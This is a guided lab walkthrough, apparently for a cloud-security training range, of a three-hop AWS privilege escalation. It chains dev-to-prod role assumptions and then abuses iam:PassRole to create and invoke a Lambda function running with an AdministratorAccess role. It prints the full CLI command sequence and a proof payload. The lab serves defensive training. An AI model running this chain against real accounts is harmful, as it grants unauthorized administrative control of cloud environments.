# Guided Walkthrough: Cross-Account PassRole to Lambda Admin

This scenario demonstrates a multi-hop cross-account privilege escalation attack where a dev user can reach full administrative privileges in the prod account through a chain of role assumptions, ultimately exploiting `iam:PassRole` permission to create a Lambda function that runs with an admin execution role.

The attack chain crosses account boundaries twice. It begins in the dev account, pivots to the prod account via a trusted cross-account role assumption, and then abuses a `PassRole` permission to attach an admin IAM role to attacker-controlled Lambda code. This pattern is deceptively common in real environments: developers often need cross-account access for deployment pipelines, and those pipeline roles frequently accumulate permissions over time, including the ability to pass roles to compute services.

The key insight here is that `iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction` is a well-known privilege escalation vector. A principal with these three permissions can effectively assume any role that the Lambda service is permitted to assume — regardless of whether that principal is authorized to assume the target role directly. This is what makes PassRole abuse so powerful, and why CSPM tools need to reason about it transitively across account boundaries.

## The Challenge

You start as `pl-pathfinding-starting-user-dev`, an IAM user in the dev account. Your goal is to achieve administrative access in the prod account.

Your starting credentials are in the `pl-pathfinding-starting-user-dev` AWS CLI profile.

The target is `arn:aws:iam::{prod_account_id}:role/pl-Lambda-admin` — an IAM role with `AdministratorAccess` in the prod account. You need to prove you can execute API calls as that role (or as a principal running with its permissions).

You have three hops to complete:

1. Dev user → dev role (`pl-lambda-prod-updater`) via `sts:AssumeRole`
2. Dev role → prod role (`pl-lambda-updater`) via cross-account `sts:AssumeRole`
3. Prod role → Lambda admin access via `iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction`

## Reconnaissance

Before exploiting anything, verify your starting identity and look for what you can do from this foothold.

```bash
# Who are you?
aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev
```

From the output, note the dev account ID. Now look for roles this user can assume:

```bash
# List roles you might be able to assume (requires iam:ListRoles, which helpful permissions include)
aws iam list-roles --profile pl-pathfinding-starting-user-dev \
  --query 'Roles[?contains(RoleName, `lambda`)].[RoleName, Arn]' \
  --output table
```

You should see `pl-lambda-prod-updater` listed. Inspect its trust policy to confirm:

```bash
aws iam get-role --role-name pl-lambda-prod-updater \
  --profile pl-pathfinding-starting-user-dev \
  --query 'Role.AssumeRolePolicyDocument'
```

The trust policy will show that it trusts the starting user (or the dev account root). Now check what permissions `pl-lambda-prod-updater` holds — specifically, look for cross-account assume-role capabilities and any PassRole grants. You will find it can assume `pl-lambda-updater` in the prod account.

## Exploitation

### Hop 1: Assume the Dev Role

Assume `pl-lambda-prod-updater` from the starting user:

```bash
DEV_CREDS=$(aws sts assume-role \
  --profile pl-pathfinding-starting-user-dev \
  --role-arn arn:aws:iam::{DEV_ACCOUNT_ID}:role/pl-lambda-prod-updater \
  --role-session-name hop1 \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)

export AWS_ACCESS_KEY_ID=$(echo "$DEV_CREDS" | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo "$DEV_CREDS" | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo "$DEV_CREDS" | awk '{print $3}')
```

Confirm you are now the dev role:

```bash
aws sts get-caller-identity
# Should show: arn:aws:sts::{DEV_ACCOUNT_ID}:assumed-role/pl-lambda-prod-updater/hop1
```

### Hop 2: Cross-Account Assume the Prod Role

With the dev role credentials active, assume `pl-lambda-updater` in the prod account. The prod role's trust policy explicitly allows assumption by this dev role:

```bash
PROD_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{PROD_ACCOUNT_ID}:role/pl-lambda-updater \
  --role-session-name hop2 \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)

export AWS_ACCESS_KEY_ID=$(echo "$PROD_CREDS" | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_CREDS" | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo "$PROD_CREDS" | awk '{print $3}')
```

Confirm you are now operating in the prod account:

```bash
aws sts get-caller-identity
# Should show: arn:aws:sts::{PROD_ACCOUNT_ID}:assumed-role/pl-lambda-updater/hop2
```

### Hop 3: PassRole Abuse — Create a Lambda with the Admin Role

Now the interesting part. As `pl-lambda-updater`, you have `iam:PassRole` scoped to `pl-Lambda-admin` and Lambda creation/invocation permissions. You cannot assume `pl-Lambda-admin` directly — but you can pass it to the Lambda service.

First, create a minimal Lambda payload that proves admin access by calling `iam:ListUsers`:

```bash
cat > /tmp/lambda_payload.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    response = iam.list_users()
    users = response.get('Users', [])
    return {
        'statusCode': 200,
        'body': json.dumps({
            'message': 'Executing as Lambda admin role!',
            'userCount': len(users),
            'users': [u['UserName'] for u in users]
        })
    }
EOF

cd /tmp && zip -q lambda_payload.zip lambda_payload.py && cd -
```

Create the Lambda function, passing the admin role as its execution role:

```bash
aws lambda create-function \
  --function-name pl-passrole-demo \
  --runtime python3.12 \
  --role arn:aws:iam::{PROD_ACCOUNT_ID}:role/pl-Lambda-admin \
  --handler lambda_payload.lambda_handler \
  --zip-file fileb:///tmp/lambda_payload.zip \
  --region us-east-1
```

The `--role` parameter is the key — you are passing `pl-Lambda-admin` to the Lambda service. The Lambda service will assume this role on your behalf when the function runs.

## Verification

Wait a moment for the function to become active, then invoke it:

```bash
aws lambda invoke \
  --function-name pl-passrole-demo \
  --payload '{}' \
  /tmp/lambda_response.json \
  --region us-east-1

cat /tmp/lambda_response.json | jq '.'
```

If the response includes a `userCount` and a list of IAM users, you have confirmed full administrative access in the prod account. The Lambda function executed `iam:ListUsers` — an operation that requires admin-level permissions — proving that the function ran as `pl-Lambda-admin`.

## What Happened

You traversed a three-hop privilege escalation chain that crossed AWS account boundaries:

1. The dev starting user assumed `pl-lambda-prod-updater` using `sts:AssumeRole` within the dev account.
2. That dev role assumed `pl-lambda-updater` in the prod account via a cross-account trust relationship — the prod role's trust policy explicitly permitted this.
3. Operating as the prod role, you exploited its `iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction` permissions to create a Lambda function running as `pl-Lambda-admin`, a role with full `AdministratorAccess` in prod.

This is a realistic attack pattern. Dev-to-prod cross-account roles are routine in CI/CD pipelines. When those pipeline roles accumulate `iam:PassRole` over time — often added to enable deployment automation — the account boundary provides no actual protection. A single compromised dev credential becomes a path to full prod admin access.

Don't forget to clean up:

```bash
aws lambda delete-function --function-name pl-passrole-demo --region us-east-1
```
